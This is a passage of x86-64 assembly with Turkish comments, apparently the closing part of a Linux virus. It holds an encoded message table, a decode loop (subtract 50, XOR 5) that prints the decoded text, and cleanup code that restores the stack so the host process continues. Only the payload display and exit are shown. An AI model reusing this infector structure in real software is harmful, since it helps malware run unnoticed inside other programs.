            db 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
            db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
            db 0x41
            len = $-msg

        payload:
            pop rsi                                             ; "decode" döngüsünü hazırla
            mov rcx, len
            lea rdi, [r15 + 3001]

            .decode:
                lodsb                                           ; byte büyüklüğünde rsi register'ından al'e ata. 
                sub  al, 50                                     ; "decode" etme işlemi
                xor  al, 5
                stosb                                           ; byte büyüklüğünde veriyi al register'ından rdi'ye sakla
                loop .decode                                    ; rcx=0 olana kadar rcx'den 1 çıkar ve döngüyü devam ettir

            lea rsi, [r15 + 3001]                               ; "decode" işleminden geçmiş payload [r15 + 3000] adresinde.
            mov rax, SYS_WRITE
            mov rdi, STDOUT                                     ; payload'u göster
            mov rdx, len
            syscall

cleanup:
    add rsp, 5000                                               ; asıl sürecin normal şekilde devam edebilmesi için stack'i eski haline getir 
    pop rsp
    pop rdx

v_stop:
    xor rdi, rdi                                                ; çıkış kodu 0
    mov rax, SYS_EXIT
    syscall
